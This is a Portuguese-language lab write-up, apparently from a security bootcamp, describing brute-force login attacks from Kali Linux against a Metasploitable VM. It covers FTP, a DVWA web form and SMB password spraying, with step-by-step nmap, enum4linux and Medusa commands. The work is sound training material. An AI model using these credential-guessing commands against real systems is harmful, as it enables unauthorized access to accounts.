# Desafio-simulando-um-Ataque-Brute-Force-de-Senhas-com-Medusa-e-KaliLinux 

# Ataque Brute Force em FTP

No primeiro desafios exploramos um ataque Brute Force ftp usando a VM do KaliLinux e Metasploit usando a mesma rede interna --> (host-only), na qual vou descrever os seguites passos abaixo:

# 1°passo: Logo após descobrir o IP da VM "Metasploitable" iremos "pingar", usando o comando ping -c (IP) .
<img width="1920" height="1020" alt="image" src="https://github.com/user-attachments/assets/5267e3d5-58c2-4363-8d15-2e19610db9d9" />

Logo, recebendo essa resposta do terminal conseguindo ter sucesso na comunicação entre as duas máquinas.

# 2°passo: Vamos fazer a auditoria com o comando "nmap -sV -p 21,22,80,445,139 (IP)".
Sendo 21,22,80,445,139 sendo as portas que queremos explorar.


<img width="1920" height="1020" alt="image" src="https://github.com/user-attachments/assets/d20e95ae-b66a-4d2f-9f44-43ef730adb11" />

Para confirmar que está ativo, vamos conectar ao terminal com o comando "ftp (IP)".

<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/dc636249-74c7-4c31-a032-c0e3dbd22e17" />

Necessitando de um login é aí que entramos com o ataque utilizando a ferramenta medusa, mas primeiro vamos criar wordlists com usuário e senha comuns em um arquivo .txt.

<img width="1360" height="720" alt="Captura de tela 2025-10-30 033736" src="https://github.com/user-attachments/assets/25e42f9b-5f6c-44dd-b9de-8bfd5616532a" />
<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/58471075-c3aa-41fa-9a06-d5a45907e747" />

# 3°passo é mandar o seguinte comando para o terminal "medusa -h (IP) -U user.txt -P pass.txt -M ftp -t 6".

<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/3a01e890-d8c4-4f65-bc9c-826df6bdffe2" />

Logo depois de descorir o login com sucesso vamos testá-lo.

# 4°passo é usar novamente o comando "ftp (IP)" para realizar o login



<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/222ea058-42c5-4a3d-a17e-1d36a1403e3e" />



Assim terminamos o ataque.



# Ataque Brute Force em um sistema da web e automatizado

# 1°passo: vamos usar o formulário de login disponível na web como "(IP)/drwa/login.php"

<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/270c1c2f-23c5-4398-82c3-aa426646c260" /> 



Não conseguindo entrar vamos criar uma wordlist de users e password, no qual nesse teste vamos usar as mesmas criadas anteriormente



# 2°passo; inserir o comando para o medusa agir dentroo do site da web

 "medusa -h (IP) -U user.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php'\
-m FORM:'username^USER^&password=^PASS^&Login=Login'
-m 'FAIL=Login failed' -t 6 

<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/9bf8872e-1def-4ee8-aea3-7fcf759a4de0" />

Utilizando o primeiro casa de sucesso para realizar o login e conseguindo entrar na interface de usuário.

# Ataque Brute Force em SMB e password spraying 

# 1° passo é fazer a enumeração com o "enum4linux"
|
|--> para isso vamos utilizar o comando "enum4linux -a (IP) | tee enum4_output.txt", para gravar a saída em um arquivo.

<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/b4956280-d2bd-4023-af89-8bcd38aa09ab" />


# 2°passo vamos utilizar o comando "less enum4_output.txt", para ler e identificar os users

<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/a95f1aa6-8dc0-4b1b-b106-17e3f2c3809d" />

# 3°passo é criar as wordlists de user e password
# 4°passo é realizar o ataque com medusa usando o comando "medusa -h (IP) -U(wordliste_users) -P(wordlist_pwd) -M SMBNT -t 2 -T 50

<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/aa47a7dc-86d8-471a-a78a-5191f21b50c5" />

Após descobrir o acesso correto vamos ao 5° passo

# 5°passo iremos testar o acesso usando o comando "smbclient -L //(IP) -U (user) 

<img width="1360" height="720" alt="image" src="https://github.com/user-attachments/assets/d076b926-1d53-48e1-8c3c-c1dc5e876932" />


# Grato pela oportunidade de poder estar realizando esse bootcamp que eu tenho certeza que está me agregando muito conhecimento e pela qualidade dos professores.

